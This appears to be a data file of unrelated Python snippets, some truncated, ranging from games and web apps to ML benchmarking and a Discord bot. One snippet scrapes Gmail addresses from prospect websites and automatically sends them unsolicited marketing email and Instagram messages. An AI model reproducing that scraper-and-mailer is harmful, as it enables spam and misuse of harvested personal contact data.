    "import random\n\nscore=0\n\n\nlist=[\"Virat Kohli\",\"Priyanka Chopra\",\"Shraddha Kapoor\",\"Narendra Modi\",\"Alia Bhatt\",\"Katrina Kaif\",\"Deepika\",\"Neha Kakkar\",\"Urvashi Rautela\",\"Jacqueline Fernandez\"]\nglobal first_choice,second_choice,first_index,second_index\nfirst_choice=(random.choice(list))\nsecond_choice=(random.choice(list))\nfirst_index=list.index(first_choice)\nsecond_index=list.index(second_choice)\n\nprint(\"------------The game is to find who has more followers between both------------\")\nagain='y'\n\nwhile(again!='n'):\n    first_choice=(random.choice(list))\n    second_choice=(random.choice(list))\n    first_index=list.index(first_choice)\n    second_index=list.index(second_choice)\n\n    print(f\"A:   The first name is {first_choice}\")\n    print(\"-----------------V|S-----------------\")\n    print(f\"B:   The second name is {second_choice}\\n\")\n    user_guess=input(\"Guess who is the winner?Between 'A' and 'B' : \")\n\n    if user_guess=='A':\n        \n        if first_index < second_index:\n            score+=1\n            print(f\"Your score is {score}\")\n            print(\"Nice Job\")\n        else:\n            print(\"You loose!!\")\n            \n    elif user_guess=='B':\n        if first_index > second_index:\n            score+=1\n            print(f\"Your score is {score}\")\n            print(\"Nice Job\")\n            \n        else:\n            print(\"You loose!!\")\n\n    again=input(\"\\n\\nDo you want to continue? 'y' or 'n' : \")\n\n",
    "from flask import jsonify\nfrom flask_restful import abort, Resource\nfrom data.jobs import Jobs\nfrom data import db_session\nfrom parse_job import parser\n\n\ndef job_not_found(job_id):\n    session = db_session.create_session()\n    job = session.query(Jobs).get(job_id)\n    if not job:\n        abort(404, message=f\"Job {job_id} not found\")\n\n\nclass JobsResource(Resource):\n    def get(self, job_id):\n        job_not_found(job_id)\n        session = db_session.create_session()\n        job = session.query(Jobs).get(job_id)\n        return jsonify({'job': job.to_dict(\n            only=('id', 'team_leader', 'job',\n                  'work_size', 'collaborators', 'start_date', 'end_date', 'is_finished'))})\n\n    def put(self, job_id):\n        args = parser.parse_args()\n        job_not_found(job_id)\n        session = db_session.create_session()\n        job = {\n            'team_leader': args['team_leader'],\n            'job': args['job'],\n            'work_size': args['work_size'],\n            'collaborators': args['collaborators'],\n            'start_date': args['start_date'],\n            'end_date': args['end_date'],\n            'is_finished': args['is_finished']\n        }\n        session.query(Jobs).filter(Jobs.id == job_id).update(job)\n        session.commit()\n        return jsonify({'success': 'OK'})\n\n    def delete(self, job_id):\n        job_not_found(job_id)\n        session = db_session.create_session()\n        job = session.query(Jobs).get(job_id)\n        session.delete(job)\n        session.commit()\n        return jsonify({'success': 'OK'})\n\n\nclass JobsListResource(Resource):\n    def get(self):\n        session = db_session.create_session()\n        jobs = session.query(Jobs).all()\n        return jsonify({'jobs': [item.to_dict(\n            only=('id', 'team_leader', 'job',\n                  'work_size', 'collaborators', 'start_date', 'end_date', 'is_finished')) for item in jobs]})\n\n    def post(self):\n        args = parser.parse_args()\n        session = db_session.create_session()\n        job = Jobs(\n            team_leader = args['team_leader'],\n            job = args['job'],\n            work_size = args['work_size'],\n            collaborators = args['collaborators'],\n            start_date = args['start_date'],\n            end_date = args['end_date'],\n            is_finished = args['is_finished']\n        )\n        session.add(job)\n        session.commit()\n        return jsonify({'success': 'OK'})",
    "\n\nfrom pygame import *\nimport sys\nfrom os.path import abspath, dirname\nfrom random import choice\n\nBASE_PATH = abspath(dirname(__file__))\nFONT_PATH = BASE_PATH + '/fonts/'\nIMAGE_PATH = BASE_PATH + '/images/'\nSOUND_PATH = BASE_PATH + '/sounds/'\n\n# Colors (R, G, B)\nWHITE = (255, 255, 255)\nGREEN = (78, 255, 87)\nYELLOW = (241, 255, 0)\nBLUE = (80, 255, 239)\nPURPLE = (203, 0, 255)\nRED = (237, 28, 36)\n\nSCREEN = display.set_mode((800, 600))\nFONT = FONT_PATH + 'space_invaders.ttf'\nIMG_NAMES = ['ship', 'mystery',\n             'enemy1_1', 'enemy1_2',\n             'enemy2_1', 'enemy2_2',\n             'enemy3_1', 'enemy3_2',\n             'explosionblue', 'explosiongreen', 'explosionpurple',\n             'laser', 'enemylaser']\nIMAGES = {name: image.load(IMAGE_PATH + '{}.png'.format(name)).convert_alpha()\n          for name in IMG_NAMES}\n\nBLOCKERS_POSITION = 450\nENEMY_DEFAULT_POSITION = 65  # Initial value for a new game\nENEMY_MOVE_DOWN = 35\n\n\nclass Ship(sprite.Sprite):\n    def __init__(self):\n        sprite.Sprite.__init__(self)\n        self.image = IMAGES['ship']\n        self.rect = self.image.get_rect(topleft=(375, 540))\n        self.speed = 5\n\n    def update(self, keys, *args):\n        if keys[K_LEFT] and self.rect.x > 10:\n            self.rect.x -= self.speed\n        if keys[K_RIGHT] and self.rect.x < 740:\n            self.rect.x += self.speed\n        game.screen.blit(self.image, self.rect)\n\n\nclass Bullet(sprite.Sprite):\n    def __init__(self, xpos, ypos, direction, speed, filename, side):\n        sprite.Sprite.__init__(self)\n        self.image = IMAGES[filename]\n        self.rect = self.image.get_rect(topleft=(xpos, ypos))\n        self.speed = speed\n        self.direction = direction\n        self.side = side\n        self.filename = filename\n\n    def update(self, keys, *args):\n        game.screen.blit(self.image, self.rect)\n        self.rect.y += self.speed * self.direction\n        if self.rect.y < 15 or self.rect.y > 600:\n            self.kill()\n\n\nclass Enemy(sprite.Sprite):\n    def __init__(self, row, column):\n        sprite.Sprite.__init__(self)\n        self.row = row\n        self.column = column\n        self.images = []\n        self.load_images()\n        self.index = 0\n        self.image = self.images[self.index]\n        self.rect = self.image.get_rect()\n\n    def toggle_image(self):\n        self.index += 1\n        if self.index >= len(self.images):\n            self.index = 0\n        self.image = self.images[self.index]\n\n    def update(self, *args):\n        game.screen.blit(self.image, self.rect)\n\n    def load_images(self):\n        images = {0: ['1_2', '1_1'],\n                  1: ['2_2', '2_1'],\n                  2: ['2_2', '2_1'],\n                  3: ['3_1', '3_2'],\n                  4: ['3_1', '3_2'],\n                  }\n        img1, img2 = (IMAGES['enemy{}'.format(img_num)] for img_num in\n                      images[self.row])\n        self.images.append(transform.scale(img1, (40, 35)))\n        self.images.append(transform.scale(img2, (40, 35)))\n\n\nclass EnemiesGroup(sprite.Group):\n    def __init__(self, columns, rows):\n        sprite.Group.__init__(self)\n        self.enemies = [[None] * columns for _ in range(rows)]\n        self.columns = columns\n        self.rows = rows\n        self.leftAddMove = 0\n        self.rightAddMove = 0\n        self.moveTime = 600\n        self.direction = 1\n        self.rightMoves = 30\n        self.leftMoves = 30\n        self.moveNumber = 15\n        self.timer = time.get_ticks()\n        self.bottom = game.enemyPosition + ((rows - 1) * 45) + 35\n        self._aliveColumns = list(range(columns))\n        self._leftAliveColumn = 0\n        self._rightAliveColumn = columns - 1\n\n    def update(self, current_time):\n        if current_time - self.timer > self.moveTime:\n            if self.direction == 1:\n                max_move = self.rightMoves + self.rightAddMove\n            else:\n                max_move = self.leftMoves + self.leftAddMove\n\n            if self.moveNumber >= max_move:\n                self.leftMoves = 30 + self.rightAddMove\n                self.rightMoves = 30 + self.leftAddMove\n                self.direction *= -1\n                self.moveNumber = 0\n                self.bottom = 0\n                for enemy in self:\n                    enemy.rect.y += ENEMY_MOVE_DOWN\n                    enemy.toggle_image()\n                    if self.bottom < enemy.rect.y + 35:\n                        self.bottom = enemy.rect.y + 35\n            else:\n                velocity = 10 if self.direction == 1 else -10\n                for enemy in self:\n                    enemy.rect.x += velocity\n                    enemy.toggle_image()\n                self.moveNumber += 1\n\n            self.timer += self.moveTime\n\n    def add_internal(self, *sprites):\n        super(EnemiesGroup, self).add_internal(*sprites)\n        for s in sprites:\n            self.enemies[s.row][s.column] = s\n\n    def remove_internal(self, *sprites):\n        super(EnemiesGroup, self).remove_internal(*sprites)\n        for s in sp",
    "\"\"\"\nA much shorter version of train.py for benchmarking\n\"\"\"\nimport os\nfrom contextlib import nullcontext\nimport numpy as np\nimport time\nimport torch\nfrom model import GPTConfig, GPT\n\n# -----------------------------------------------------------------------------\nbatch_size = 12\nblock_size = 1024\nbias = False\nreal_data = True\nseed = 1337\ndevice = 'cuda' # examples: 'cpu', 'cuda', 'cuda:0', 'cuda:1', etc.\ndtype = 'bfloat16' if torch.cuda.is_available() and torch.cuda.is_bf16_supported() else 'float16' # 'float32' or 'bfloat16' or 'float16'\ncompile = True # use PyTorch 2.0 to compile the model to be faster\nprofile = False # use pytorch profiler, or just simple benchmarking?\nexec(open('configurator.py').read()) # overrides from command line or config file\n# -----------------------------------------------------------------------------\n\ntorch.manual_seed(seed)\ntorch.cuda.manual_seed(seed)\ntorch.backends.cuda.matmul.allow_tf32 = True # allow tf32 on matmul\ntorch.backends.cudnn.allow_tf32 = True # allow tf32 on cudnn\ndevice_type = 'cuda' if 'cuda' in device else 'cpu' # for later use in torch.autocast\nptdtype = {'float32': torch.float32, 'bfloat16': torch.bfloat16, 'float16': torch.float16}[dtype]\nctx = nullcontext() if device_type == 'cpu' else torch.amp.autocast(device_type=device_type, dtype=ptdtype)\n\n# data loading init\nif real_data:\n    dataset = 'openwebtext'\n    data_dir = os.path.join('data', dataset)\n    train_data = np.memmap(os.path.join(data_dir, 'train.bin'), dtype=np.uint16, mode='r')\n    def get_batch(split):\n        data = train_data # note ignore split in benchmarking script\n        ix = torch.randint(len(data) - block_size, (batch_size,))\n        x = torch.stack([torch.from_numpy((data[i:i+block_size]).astype(np.int64)) for i in ix])\n        y = torch.stack([torch.from_numpy((data[i+1:i+1+block_size]).astype(np.int64)) for i in ix])\n        x, y = x.pin_memory().to(device, non_blocking=True), y.pin_memory().to(device, non_blocking=True)\n        return x, y\nelse:\n    # alternatively, if fixed data is desired to not care about data loading\n    x = torch.randint(50304, (batch_size, block_size), device=device)\n    y = torch.randint(50304, (batch_size, block_size), device=device)\n    get_batch = lambda split: (x, y)\n\n# model init\ngptconf = GPTConfig(\n    block_size = block_size, # how far back does the model look? i.e. context size\n    n_layer = 12, n_head = 12, n_embd = 768, # size of the model\n    dropout = 0, # for determinism\n    bias = bias,\n)\nmodel = GPT(gptconf)\nmodel.to(device)\n\noptimizer = model.configure_optimizers(weight_decay=1e-2, learning_rate=1e-4, betas=(0.9, 0.95), device_type=device_type)\n\nif compile:\n    print(\"Compiling model...\")\n    model = torch.compile(model) # pytorch 2.0\n\nif profile:\n    # useful docs on pytorch profiler:\n    # - tutorial https://pytorch.org/tutorials/intermediate/tensorboard_profiler_tutorial.html\n    # - api https://pytorch.org/docs/stable/profiler.html#torch.profiler.profile\n    wait, warmup, active = 5, 5, 5\n    num_steps = wait + warmup + active\n    with torch.profiler.profile(\n        activities=[torch.profiler.ProfilerActivity.CPU, torch.profiler.ProfilerActivity.CUDA],\n        schedule=torch.profiler.schedule(wait=wait, warmup=warmup, active=active, repeat=1),\n        on_trace_ready=torch.profiler.tensorboard_trace_handler('./bench_log'),\n        record_shapes=False,\n        profile_memory=False,\n        with_stack=False, # incurs an additional overhead, disable if not needed\n        with_flops=True,\n        with_modules=False, # only for torchscript models atm\n    ) as prof:\n\n        X, Y = get_batch('train')\n        for k in range(num_steps):\n            with ctx:\n                logits, loss = model(X, Y)\n            X, Y = get_batch('train')\n            optimizer.zero_grad(set_to_none=True)\n            loss.backward()\n            optimizer.step()\n            lossf = loss.item()\n            print(f\"{k}/{num_steps} loss: {lossf:.4f}\")\n\n            prof.step() # notify the profiler at end of each step\n\nelse:\n\n    # simple benchmarking\n    torch.cuda.synchronize()\n    for stage, num_steps in enumerate([10, 20]): # burnin, then benchmark\n        t0 = time.time()\n        X, Y = get_batch('train')\n        for k in range(num_steps):\n            with ctx:\n                logits, loss = model(X, Y)\n            X, Y = get_batch('train')\n            optimizer.zero_grad(set_to_none=True)\n            loss.backward()\n            optimizer.step()\n            lossf = loss.item()\n            print(f\"{k}/{num_steps} loss: {lossf:.4f}\")\n        torch.cuda.synchronize()\n        t1 = time.time()\n        dt = t1-t0\n        mfu = model.estimate_mfu(batch_size * 1 * num_steps, dt)\n        if stage == 1:\n            print(f\"time per iteration: {dt/num_steps*1000:.4f}ms, MFU: {mfu*100:.2f}%\")\n",
    "from rich import text\nfrom rich import box\nfrom rich import print\nfrom rich.panel import Panel\nfrom rich.traceback import install\ninstall(show_locals=True)\n\nimport pandas as pd\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\nfrom instagrapi import Client\nfrom instagrapi.exceptions import UserNotFound, LoginRequired\nimport logging\nfrom mailjet_rest import Client as MailjetClient\nimport time\n\n# Setup logging\nlogger = logging.getLogger()\n\n# Load the CSV file\nfile_path = 'Examplar Prospects List.csv'\ndf = pd.read_csv(file_path)\n\n# Assuming the website links are in column 'F'\nwebsites = df.iloc[:, 5]  # Adjust the column index as necessary\n\n# Instagrapi client setup\ncl = Client()\ncl.delay_range = [45, 50]  # Set delay range for requests\n\n# Replace these with your actual username and password\nUSERNAME = \"ig_user\"\nPASSWORD = \"ig_pass\"\n\n# Mailjet setup\nmailjet_api_key = 'mailjet_api_key'\nmailjet_api_secret = 'mailjet_secret_key'\nmailjet_client = MailjetClient(auth=(mailjet_api_key, mailjet_api_secret), version='v3.1')\n\ndef login_user():\n    \"\"\"\n    Login to Instagram with username and password.\n    \"\"\"\n    try:\n        cl.login(USERNAME, PASSWORD)\n        logger.info(\"Logged in successfully.\")\n    except Exception as e:\n        logger.error(f\"Login failed: {e}\")\n        raise Exception(\"Login failed\")\n\nlogin_user()\n\ndef scrape_facebook_and_gmail(websites):\n    facebook_links = []\n    gmail_addresses = []\n\n    for url in websites:\n        try:\n            response = requests.get(url, timeout=10)\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.text, 'html.parser')\n                links = soup.find_all('a', href=True)\n                for link in links:\n                    href = link['href']\n                    if \"facebook.com\" in href:\n                        facebook_links.append(href)\n                text = soup.get_text()\n                gmail_addresses.extend(re.findall(r\"[a-zA-Z0-9_.+-]+@gmail.com\", text))\n        except requests.RequestException as e:\n            logger.error(f\"Error fetching {url}: {e}\")\n    \n    # Print all Facebook links\n    print(Panel.fit(\"\\n\".join(facebook_links), title=\"Facebook Links\", border_style=\"bold blue\", box=box.SQUARE))\n    # Print all Gmail addresses\n    print(Panel.fit(\"\\n\".join(gmail_addresses), title=\"Gmail Addresses\", border_style=\"bold magenta\", box=box.SQUARE))\n\n    # Email sending to the scraped Gmail addresses\n    for email in gmail_addresses:\n        send_email(email)\n\ndef send_email(recipient_email):\n    data = {\n      'Messages': [\n        {\n          \"From\": {\n            \"Email\": \"wordsmithscripts@gmail.com\",\n            \"Name\": \"WordSmith Corp.\"\n          },\n          \"To\": [\n            {\n              \"Email\": recipient_email,\n              \"Name\": \"Recipient Name or Title\"\n            }\n          ],\n          \"Subject\": \"Unlocking Potential with WordSmith Agency\",\n          \"TextPart\": \"Greetings, We've noticed your potential and we're excited to offer our services to help elevate your business. Let's connect for a transformative collaboration.\",\n          \"HTMLPart\": \"<h3>Ready to Elevate Your Business?</h3><p>We at WordSmith Agency are thrilled at the prospect of working with you. Let's make something great together.</p>\",\n          \"CustomID\": \"AppGettingStartedTest\"\n        }\n      ]\n    }\n    result = mailjet_client.send.create(data=data)\n    if result.status_code == 200:\n        print(Panel.fit(f\"Email successfully sent to {recipient_email}\", border_style=\"bold green\", box=box.SQUARE))\n    else:\n        print(Panel.fit(f\"Failed to send email to {recipient_email}. Error: {result.json()}\", border_style=\"bold red\", box=box.SQUARE))\n\ndef send_instagram_message(websites):\n    messages_sent = 0\n    for url in websites:\n        if messages_sent >= 15:\n            break  # Stop sending messages after 15\n        found_instagram = False\n        try:\n            response = requests.get(url, timeout=10)\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.text, 'html.parser')\n                links = soup.find_all('a', href=True)\n                for link in links:\n                    href = link['href']\n                    if \"instagram.com\" in href:\n                        username = extract_instagram_username(href)\n                        if username:\n                            found_instagram = True\n                            try:\n                                user_id = cl.user_id_from_username(username)\n                                message = f\"Hey {username},\\n\\nImpressed by the range of services, especially as summer heats up the demand. We offer expert digital marketing with a twist: no payment until you see results. Ready to make this summer your most profitable one? Let's chat.\"\n                                cl.direct_send(message, [user_id])\n                                cl.direct_send(message, user_id)\n                                messages_sent += 1\n        ",
    "# find instruction in the readme.md on how to run this file.\nfrom pyswip import Prolog, Variable, Functor, registerForeign\nfrom pyswip.easy import *\n\nprolog = Prolog()  # create a Prolog instance\n\n# define answer options for each question\nchoices = {\n    \"payment_preference\": [\"Free\", \"Paid\"],\n    \"coffee_available\": [\"Yes\", \"No\"],\n    \"food_available\": [\"Yes\", \"No\"],\n    \"meal_type\": [\"full_meal\", \"no_full_meal\"],\n    \"walking_distance\": [\"Yes\", \"No\"],\n    \"travel_distance\": [\"less_than_5km\", \"more_than_5km\"],\n    \"plug_needed\": [\"Yes\", \"No\"],\n    \"wifi_needed\": [\"Yes\", \"No\"],\n    \"closing_time\": [\"17\", \"18\", \"19\", \"20\", \"21\"],\n    \"wheelchair_accessible\": [\"Yes\", \"No\"],\n}\n\n# define prompts for each question\nprompts = {\n    \"payment_preference\": \"Do you want a free or paid study spot?\",\n    \"coffee_available\": \"Do you want a study spot that has coffee available?\",\n    \"food_available\": \"Do you want a study spot that has food available?\",\n    \"meal_type\": \"Do you want a full meal or a snack/pastry?\",\n    \"walking_distance\": \"Do you want the cafe to be within walking distance?\",\n    \"travel_distance\": \"How far are you willing to travel for your study spot?\",\n    \"plug_needed\": \"Do you need a plug/outlet?\",\n    \"wifi_needed\": \"Do you need a study space with free Wifi?\",\n    \"closing_time\": \"How late would you like to stay at the study spot?\",\n    \"wheelchair_accessible\": \"Do you need your study spot to be wheelchair accessible?\",\n}\n\nchoices_natural_language = {  # for printing purposes\n    \"full_meal\": \"Full meal\",\n    \"no_full_meal\": \"snack\",\n    \"less_than_5km\": \"less than 5 km\",\n    \"more_than_5km\": \"more than 5 km\",\n    \"17\": \"5:00pm\",\n    \"18\": \"6:00pm\",\n    \"19\": \"7:00pm\",\n    \"20\": \"8:00pm\",\n    \"21\": \"9:00pm\",\n}\n\n# dictionary of cafe names and links\nrecommendations_reference = {\n    \"saint_espresso\": {\n        \"name\": \"Saint Espresso\",\n        \"link\": \"http://www.saintespresso.com/\",\n    },\n    \"goswell_road_coffee\": {\n        \"name\": \"Goswell Road Coffee\",\n        \"link\": \"https://www.instagram.com/goswellroadcoffee/\",\n    },\n    \"gecko_coffeehouse\": {\n        \"name\": \"Gecko\",\n        \"link\": \"https://geckocoffee.house/pages/menu\",\n    },\n    \"the_british_library\": {\"name\": \"British Library\", \"link\": \"https://www.bl.uk/\"},\n    \"cafebotanical\": {\n        \"name\": \"Cafe Botanical\",\n        \"link\": \"https://www.cafebotanical.com/\",\n    },\n    \"barbican_centre\": {\"name\": \"Barbican\", \"link\": \"https://www.barbican.org.uk/\"},\n    \"attendant_coffee_roasters_shoreditch\": {\n        \"name\": \"Attendant\",\n        \"link\": \"https://www.the-attendant.com/pages/shoreditch\",\n    },\n    \"national_art_library\": {\n        \"name\": \"National Art Library\",\n        \"link\": \"http://www.vam.ac.uk/nal/\",\n    },\n    \"wellcome_collection\": {\n        \"name\": \"Welcome Collection\",\n        \"link\": \"https://wellcomecollection.org/\",\n    },\n    \"senate_house_library\": {\n        \"name\": \"Senate House Library\",\n        \"link\": \"https://www.london.ac.uk/senate-house-library\",\n    },\n    \"chestnut_bakery\": {\n        \"name\": \"Chestnut Bakery\",\n        \"link\": \"http://www.chestnutbakery.com/\",\n    },\n    \"bench\": {\"name\": \"Bench\", \"link\": \"http://www.benchlondon.com/\"},\n    \"briki\": {\"name\": \"Briki\", \"link\": \"https://www.instagram.com/brikilondon/?hl=en\"},\n    \"katsute_100\": {\"name\": \"Katsute 100\", \"link\": \"http://www.katsute100.com/\"},\n    \"burr_co_london\": {\n        \"name\": \"Burr\",\n        \"link\": \"https://www.kimptonfitzroylondon.com/us/en/london-restaurant/burr-and-co\",\n    },\n    \"commons_at_old_street_works\": {\n        \"name\": \"Commons\",\n        \"link\": \"http://www.commonsat.co.uk/\",\n    },\n    \"the_hoxton\": {\n        \"name\": \"The Hoxton\",\n        \"link\": \"https://thehoxton.com/london/shoreditch/hoxton-grill-restaurant/\",\n    },\n    \"waterstones\": {\n        \"name\": \"Waterstones\",\n        \"link\": \"https://www.waterstones.com/bookshops/islington\",\n    },\n    \"dishoom_kings_cross\": {\n        \"name\": \"Dishroom\",\n        \"link\": \"https://www.dishoom.com/kings-cross?utm_source=google&utm_medium=organic&utm_campaign=Yext&utm_content=D3-KingsCross&y_source=1_MjMwNDkyMDItNzE1LWxvY2F0aW9uLndlYnNpdGU%3D\",\n    },\n    \"kensington_central_library\": {\n        \"name\": \"Kensington\",\n        \"link\": \"http://www.rbkc.gov.uk/libraries\",\n    },\n    \"hilton_london_tower_bridge\": {\n        \"name\": \"Hilton\",\n        \"link\": \"https://www.hilton.com/en/hotels/lontbhi-hilton-london-tower-bridge/?SEO_id=GMB-EMEA-HI-LONTBHI\",\n    },\n    \"redemption_roasters\": {\n        \"name\": \"Redemption\",\n        \"link\": \"https://www.redemptionroasters.com/locations/islington-high-street/#menu?utm_source=GMB&utm_medium=organic\",\n    },\n    \"pretamanger\": {\n        \"name\": \"Pret A Manger\",\n        \"link\": \"https://www.pret.co.uk/en-GB/our-menu\",\n    },\n}\n\n\ndef load_knowledge_base(\n    retractall,\n    known,\n    filename=\"none\",\n):\n    # get the path to the KB file\n    try:\n        prolog.consult(\n            filename\n        )  # load the KB file (make sure you open the entire fo",
    "#Hint System\n\ndef qAndA():\n    print(\"\\n\\n\\nWelcome to Night Among The Tree's Q&A System!\")\n    print(\"Here you can get some questions you might have\")\n    print(\"about the game answered.\")\n    print(\"But I encourage you to explore the game first before\")\n    print(\"looking at these!\")\n    hints1()\n\ndef hints1():\n    print(\"\\n\\n\\n\")\n    print(\"Please enter the number of the question you want an\")\n    print(\"answer to, such as '1'.\\n\")\n    print(\"This first page is for early game questions.\\n\")\n    print(\"1. Where should I go first?\")\n    print(\"2. How can I get into the gift shop?\")\n    print(\"3. How can I navigate the woods?\")\n    print(\"4. Where can I find a gift for Ms. Ravenlock?\")\n    print(\"5. Can I climb the rockslide?\")\n    print(\"6. How can I beat the game?\")\n    print(\"Enter 'n' to go to the next set of questions.\")\n    print(\"Enter 'e' to return to the title screen.\")\n    i = input(\"\\nI would like to... \")\n    if i == '1':\n        print(\"\\nGo to the factory first. Make sure to check out the\")\n        print(\"outside area and grab the gloves before turning on the power.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '2':\n        print(\"\\nYou need to turn on the power first.\")\n        print(\"This can be done in the factory.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '3':\n        print(\"\\nThe woods are very tricky to navigate.\")\n        print(\"However, any time you enter them you will start at the same location,\")\n        print(\"regardless of where you entered from.\")\n        print(\"However, beware! If you go into the woods without the compass you are already dead.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '4':\n        print(\"\\nThe gift for Ms. Ravenlock is located outside the factory.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '5':\n        print(\"\\nYou cannot climb the rockslide until late in the game.\")\n        print(\"I recommend focusing on other areas before then.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '6':\n        print(\"\\nThere are two good endings to the game.\")\n        print(\"First, you can escape the monster among the trees.\")\n        print(\"To do this you need quite a few items, so I do not recommend trying this\")\n        print(\"until you feel adequately prepared.\")\n        print(\"Question 13 will list the items you need if you want to know though!\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == 'n':\n        hints2()\n    elif i == 'e':\n        return\n    else:\n        pass\n    hints1()\n\n\ndef hints2():\n    print(\"\\n\\n\\n\")\n    print(\"Please enter the number of the question you want an\")\n    print(\"answer to, such as '1'.\\n\")\n    print(\"This second page is for middle game questions.\\n\")\n    print(\"7. What is the 'bus pass'?\")\n    print(\"8. Where is the cabin?/How can I survive the cabin?\")\n    print(\"9. What items do I need from the cabin?\")\n    print(\"10. How can I access the gift shop backroom?\")\n    print(\"11. What are the key areas in the woods and how do I reach them?\")\n    print(\"12. How can I reach the item stuck in a tree near the campfire?\")\n    print(\"Enter 'n' to go to the next set of questions.\")\n    print(\"Enter 'b' to go to the previous page.\")\n    i = input(\"\\nI would like to... \")\n    if i == '7':\n        print(\"\\nThe notebook you find in the gift shop can be used as your bus pass.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '8':\n        print(\"\\nYou can reach the cabin by sleeping on the bus bench. Once you're in the cabin,\")\n        print(\"be polite and wait to see what they want. Then eat the slop, but only one bite.\")\n        print(\"Say thank you, or say nothing, just don't eat another spoonful.\")\n        print(\"You then will be able to move about the cabin! But be cautious...\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '9':\n        print(\"\\nYou need the rope, the whistle, and a hook from the cabin.\")\n        print(\"First, go into the connecting room and slowly take the hook.\")\n        print(\"Then get the rope and whistle from the pile of items.\")\n        print(\"After this, escape the cabin by going through the window.\")\n        print(\"However, beware! If you go to the cabin without the compass you are already dead.\")\n        print(\"Oh, and try the rockslide again after you get these items...\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '10':\n        print(\"\\nYou cannot access the gift shop backroom until late in the game.\")\n        print(\"I recommend focusing on other areas before then.\")\n        x = input(\"\\nPress enter when ready.\")\n    elif i == '11':\n        print(\"\\nFollow these paths after entering the woods to reach the key areas.\")\n        print(\"However, beware! If you go into the woods without the compass you are already dead.\")\n        print(\"Campfire: Forward, forward.\")\n        print(\"Cave: Right, left left. (Go left, not right in the cave.)\")\n        print(\"Journal page location: left, left",
    "# Import packages\r\nfrom dash import Dash, html, dash_table, dcc, callback, Output, Input\r\nimport pandas as pd\r\nimport plotly.express as px\r\nimport dash_bootstrap_components as dbc\r\n\r\n# Incorporate data\r\ndf = pd.read_csv('https://raw.githubusercontent.com/plotly/datasets/master/gapminder2007.csv')\r\n\r\n# Initialize the app - incorporate a Dash Bootstrap theme\r\nexternal_stylesheets = [dbc.themes.CERULEAN]\r\napp = Dash(__name__, external_stylesheets=external_stylesheets)\r\n\r\n# App layout\r\napp.layout = dbc.Container([\r\n    dbc.Row([\r\n        html.Div('My First App with Data, Graph, and Controls', className=\"text-primary text-center fs-3\")\r\n    ]),\r\n\r\n    dbc.Row([\r\n        dbc.RadioItems(options=[{\"label\": x, \"value\": x} for x in ['pop', 'lifeExp', 'gdpPercap']],\r\n                       value='lifeExp',\r\n                       inline=True,\r\n                       id='radio-buttons-final')\r\n    ]),\r\n\r\n    dbc.Row([\r\n        dbc.Col([\r\n            dash_table.DataTable(data=df.to_dict('records'), page_size=12, style_table={'overflowX': 'auto'})\r\n        ], width=6),\r\n\r\n        dbc.Col([\r\n            dcc.Graph(figure={}, id='my-first-graph-final')\r\n        ], width=6),\r\n    ]),\r\n\r\n], fluid=True)\r\n\r\n# Add controls to build the interaction\r\n@callback(\r\n    Output(component_id='my-first-graph-final', component_property='figure'),\r\n    Input(component_id='radio-buttons-final', component_property='value')\r\n)\r\ndef update_graph(col_chosen):\r\n    fig = px.histogram(df, x='continent', y=col_chosen, histfunc='avg')\r\n    return fig\r\n\r\n# Run the app\r\nif __name__ == '__main__':\r\n    app.run(debug=True)\r\n",
    "from langchain.document_loaders import DirectoryLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.schema import Document\n# from langchain.embeddings import OpenAIEmbeddings\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain.vectorstores.chroma import Chroma\nimport os\nimport shutil\n\nCHROMA_PATH = \"chroma\"\nDATA_PATH = \"docs\"\n\n\ndef main():\n    generate_data_store()\n\n\ndef generate_data_store():\n    documents = load_documents()\n    chunks = split_text(documents)\n    save_to_chroma(chunks)\n\n\ndef load_documents():\n    loader = DirectoryLoader(DATA_PATH, glob=\"**/*.md\")\n    documents = loader.load()\n    return documents\n\n\ndef split_text(documents: list[Document]):\n    text_splitter = RecursiveCharacterTextSplitter(\n        chunk_size=1800,\n        chunk_overlap=600,\n        length_function=len,\n        add_start_index=True,\n    )\n    chunks = text_splitter.split_documents(documents)\n    print(f\"Split {len(documents)} documents into {len(chunks)} chunks.\")\n\n    document = chunks[10]\n    print(document.page_content)\n    print(document.metadata)\n\n    return chunks\n\n\ndef save_to_chroma(chunks: list[Document]):\n    # Clear out the database first.\n    if os.path.exists(CHROMA_PATH):\n        shutil.rmtree(CHROMA_PATH)\n\n    # Create a new DB from the documents.\n    db = Chroma.from_documents(\n        chunks, OpenAIEmbeddings(), persist_directory=CHROMA_PATH\n    )\n    db.persist()\n    print(f\"Saved {len(chunks)} chunks to {CHROMA_PATH}.\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import discord\nimport os\nimport random\nimport asyncio\nimport datetime\nimport threading\n\nfrom discord.ext import commands\n\n# Create a new bot instance\nasyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())\nintents = discord.Intents.default()\nintents.message_content = True\nintents.members = True\nbot = commands.Bot(command_prefix='!', intents=intents)\n\n# Event: Bot is ready\n@bot.event\nasync def on_ready():\n    global initialized \n    global unionthread\n    global outputchannel\n\n    outputchannel = None\n    initialized = False\n    unionthread = None\n\n    print(f'Logged in as {bot.user.name} ({bot.user.id})')\n    print('------')\n\n\nunion_members = set()\n\n\n#Handle bot commands (only in bot-testing channel)\nasync def handle_bot_command(message):\n    global initialized\n    global union_members\n    global unionthread\n\n    command_prefixes = [\"!unionoutput\", \"!ununionize\", \"!setunionchannel\", \"!unionsay\", \"!init\", \"!uninit\"]\n    content = message.content\n    command = \"\"\n\n    for prefix in command_prefixes:\n        if content.startswith(prefix):\n            command = prefix\n            param = content[len(prefix)+1:] if len(content)>len(prefix) else \"\"\n            break\n        \n    match command:\n        case \"!unionoutput\":\n            for channel in message.guild.channels:\n                if channel.name == param:\n                    global outputchannel \n                    outputchannel = 